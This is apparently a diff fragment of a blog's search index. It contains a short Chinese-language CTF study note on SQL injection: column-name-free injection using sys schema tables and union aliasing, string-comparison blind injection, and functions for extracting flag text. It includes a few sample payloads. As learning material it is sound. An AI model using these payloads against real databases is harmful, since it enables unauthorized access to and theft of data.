+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="替换列名"><a href="#替换列名" class="headerlink" title="替换列名"></a>替换列名</h1><p>在information_schema被ban的情况下使用无列名注入</p>
+<p>表名可以用</p>
+<h2 id="sys-schema-auto-increment-columns（）"><a href="#sys-schema-auto-increment-columns（）" class="headerlink" title="sys.schema_auto_increment_columns（）"></a>sys.schema_auto_increment_columns（）</h2><h2 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h2><p>在sql语句中可以用select和union组合可以替换列名</p>
+<p>select 1,2,3 union select*from table</p>
+<p>table中的列名会被替换成1，2，3</p>
+<p>select `1`from(select1,2,3 union select *from table)a</p>
+<p>这样就可查出table表第一列的内容，实际上替换列名只是创建了一张临时表，所以在后面加了a给这个临时表命名</p>
+<h1 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h1><p>在union和报错都被过滤的情况下，用字符串比较进行盲注</p>
+<p>在sql中字符串比较会取出要对比的第一个字符，先进行对比，如错误就直接返回false，正确才会进行下一位的比较</p>
+<p>基本的playload</p>
+<p>select 1,’a’ &gt;select*from table</p>
+<h1 id="join报错"><a href="#join报错" class="headerlink" title="join报错"></a>join报错</h1><h1 id="输出flag时有其他字符干扰，且输出长度受限"><a href="#输出flag时有其他字符干扰，且输出长度受限" class="headerlink" title="输出flag时有其他字符干扰，且输出长度受限"></a>输出flag时有其他字符干扰，且输出长度受限</h1><p>在sql注入的语句的末尾添加regexp函数进行对输出字符串的正则匹配，基本用【^f】匹配以f开头的字符</p>
+<p>用right，left函数让字符串从左右输出</p>
+<p>用substr输出任意位置任意长度的字符</p>
+<p>用reverse倒叙输出字符</p>
+<p>配合python的切片-1，来正序</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">y=<span class="string">&#x27;&#x27;</span></span><br><span class="line">y=y[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
   </entry>
 </search>
